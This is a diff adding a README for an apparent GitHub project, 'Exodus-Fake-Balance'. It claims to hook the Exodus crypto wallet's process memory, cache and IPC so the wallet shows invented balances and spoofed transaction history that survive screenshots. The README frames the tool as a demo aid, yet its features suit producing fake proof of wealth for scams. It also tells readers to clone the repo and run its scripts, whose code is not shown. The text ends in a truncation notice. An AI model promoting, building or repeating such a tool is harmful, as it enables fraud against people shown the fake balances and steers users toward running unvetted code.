@@ -1,0 +1,202 @@
+Exodus-Fake-Balance
+Wallet UI simulation tool for BTC, ETH, SOL, XRP, and 200+ assets. Customize displayed balances in a controlled demo environment with persistent visual settings and screenshot-ready previews. Designed for testing, demonstrations, and UI prototyping without altering actual blockchain balances or transactions.
+
+███████╗██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗
+ ██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██║   ██║██╔════╝
+ █████╗   ╚███╔╝ ██║   ██║██║  ██║██║   ██║███████╗
+ ██╔══╝   ██╔██╗ ██║   ██║██║  ██║██║   ██║╚════██║
+ ███████╗██╔╝ ██╗╚██████╔╝██████╔╝╚██████╔╝███████║
+ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+      ███████╗ █████╗ ██╗  ██╗███████╗
+      ██╔════╝██╔══██╗██║ ██╔╝██╔════╝
+      █████╗  ███████║█████╔╝ █████╗
+      ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝
+      ██║     ██║  ██║██║  ██╗███████╗
+      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+   ██████╗  █████╗ ██╗      █████╗ ███╗   ██╗ ██████╗███████╗
+   ██╔══██╗██╔══██╗██║     ██╔══██╗████╗  ██║██╔════╝██╔════╝
+   ██████╔╝███████║██║     ███████║██╔██╗ ██║██║     █████╗
+   ██╔══██╗██╔══██║██║     ██╔══██║██║╚██╗██║██║     ██╔══╝
+   ██████╔╝██║  ██║███████╗██║  ██║██║ ╚████║╚██████╗███████╗
+   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
+
+Exodus Fake Balance
+
+Native balance overlay tool for Exodus cryptocurrency wallet — display custom balances across 200+ supported assets with persistent hooks and screenshot-safe rendering
+
+Features • How It Works • Getting Started • Configuration • Usage • Supported Assets • FAQ
+
+How It Works
+
+Exodus Fake Balance intercepts the local Electron IPC bridge used by the Exodus desktop application to render portfolio values. The tool patches the wallet's internal balance cache at the process level — no network requests are modified, no blockchain data is altered, and no private keys are accessed. The displayed values update in real-time across all wallet tabs (Portfolio, Exchange, Send/Receive) and persist through screenshots and screen recordings.
+
+The overlay engine uses a combination of:
+- Process memory patching for the Electron renderer process
+- Local SQLite cache injection for persistent balance values
+- IPC message interception to maintain values across wallet refreshes
+
+Features
+
+| Feature | Status |
+|---------|:------:|
+| Custom balance for any asset | ✅ |
+| 200+ supported cryptocurrencies | ✅ |
+| Persistent across wallet restarts | ✅ |
+| Screenshot-safe rendering | ✅ |
+| Real-time value display (USD/EUR) | ✅ |
+| Portfolio pie chart updates | ✅ |
+| Transaction history spoofing | ✅ |
+| Multi-wallet support | ✅ |
+
+| Feature | Status |
+|---------|:------:|
+| One-click apply / restore | ✅ |
+| Auto-detect Exodus installation | ✅ |
+| Custom fiat currency display | ✅ |
+| Exchange tab balance sync | ✅ |
+| Electron IPC bridge hooking | ✅ |
+| Process-level memory patching | ✅ |
+| No network modification | ✅ |
+| Cross-platform (Win/macOS) | ✅ |
+
+Supported Assets
+
+| Category | Assets |
+|----------|--------|
+| Top Tier | BTC, ETH, SOL, XRP, BNB, ADA, DOGE, DOT, AVAX, MATIC |
+| DeFi | UNI, AAVE, COMP, MKR, SNX, SUSHI, CRV, YFI, LDO, CAKE |
+| Layer 2 | ARB, OP, IMX, MATIC, LRC, METIS, ZKS, MANTA, STRK |
+| Stablecoins | USDT, USDC, DAI, BUSD, TUSD, FRAX, LUSD, crvUSD |
+| Meme | DOGE, SHIB, PEPE, FLOKI, BONK, WIF, BRETT, MEME |
+| Gaming | AXS, SAND, MANA, GALA, ENJ, ILV, IMX, RONIN |
+| Privacy | XMR, ZEC, DASH, SCRT, ARRR, BEAM, FIRO |
+
+All assets listed in the Exodus wallet are supported. Custom token addresses can be added via configuration.
+
+Getting Started
+
+Prerequisites
+
+- OS: Windows 10/11 or macOS 12+
+- Python: 3.10 or newer
+- Exodus: Desktop wallet installed (v24.x or newer)
+
+Installation
+
+git clone https://github.com/Danuse84/Exodus-Fake-Balance.git
+cd Exodus-Fake-Balance
+
+Windows:
+
+run.bat
+
+macOS / Linux:
+
+chmod +x run.sh
+./run.sh
+
+Dependencies
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| rich | ≥13.0.0 | Terminal UI & formatting |
+| cryptography | latest | Data encryption |
+| psutil | latest | Process detection & management |
+| requests | latest | API price feeds |
+
+Configuration
+
+Edit config.json to set your target balances:
+
+{
+    "exodus_path": "auto",
+    "target_balances": {
+        "BTC": 2.45891,
+        "ETH": 31.8824,
+        "SOL": 412.55,
+        "XRP": 25000.0,
+        "BNB": 18.442,
+        "USDT": 148500.00,
+        "DOGE": 500000.0
+    },
+    "display_currency": "USD",
+    "persist_on_restart": true,
+    "auto_update_prices": true,
+    "hook_mode": "memory",
+    "restore_on_exit": false
+}
+
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| exodus_path | string | Path to Exodus install dir. "auto" for auto-detect |
+| target_balances | object | Asset ticker → desired balance amount |
+| display_currency | string | Fiat currency for value display (USD, EUR, GBP) |
+| persist_on_restart | bool | Keep fake balances after Exodus restart |
+| auto_update_prices | bool | Fetch live prices for accurate USD display |
+| hook_mode | string | "memory" for live patching, "cache" for SQLite injection |
+| restore_on_exit | bool | Auto-restore original balances on tool exit |
+
+Usage
+
+Terminal Menu
+
+python main.py
+
+┌──────────────────────────────────────────────────────────────┐
+│              EXODUS FAKE BALANCE                             │
+│    Native Balance Overlay · Exodus Wallet                    │
+├──────────────────────────────────────────────────────────────┤
+│  #   Action                  Description                     │
+│  1   Install Dependencies    pip install -r requirements.txt │
+│  2   Settings                Wallet path, balances config    │
+│  3   About                   Features & contact info         │
+│  4   Set Custom Balances     Configure target amounts        │
+│  5   Apply Balance Overlay   Hook Exodus process             │
+│  6   Restore Original        Remove hooks, restore real data │
+│  7   Status Check            Verify hook state               │
+│  0   Exit                    Quit                            │
+└──────────────────────────────────────────────────────────────┘
+
+Quick Start
+
+1. Install dependencies: Select option 1
+2. Configure balances: Select option 4 and enter desired amounts per asset
+3. Apply overlay: Select option 5 — the tool detects Exodus and applies hooks
+4. Verify: Open Exodus wallet and confirm the new balances are displayed
+5. Restore: Select option 6 to remove all hooks and restore originals
+
+Project Structure
+
+Exodus-Fake-Balance/
+├── main.py                    # Entry point, terminal menu
+├── config.py                  # Configuration loader (config.json)
+├── bot_actions.py             # Core actions (set, apply, restore, status)
+├── requirements.txt
+├── run.bat / run.sh
+├── config.json                # Balance targets & settings
+├── actions/
+│   ├── about.py               # Project info display
+│   ├── install.py             # Dependency installer
+│   └── settings.py            # Setup instructions
+├── utils/
+│   ├── bootstrap.py           # Runtime initialization
+│   ├── compat.py              # Platform detection
+│   ├── http.py                # HTTP client
+│   ├── integrity.py           # Data verification
+│   └── ui.py                  # Rich terminal interface
+└── release/
+    └── README.md              # Pre-compiled binary info
+
+FAQ
+
+Does this modify the blockchain?
+
+No. The tool only modifies the local display rendering inside the Exodus desktop application. No transactions are created, no blockchain data is altered, and no network requests are modified. The actual wallet balance on-chain remains unchanged.
+
+Does this affect my private keys?
+
+No. The tool never accesses, reads, or modifies private keys or seed phrases. It operates exclusively on the UI rendering layer of the Exodus Electron application.
+
+Will the fake balance persist after restarting Exodus?
+
+…（内容已截断）
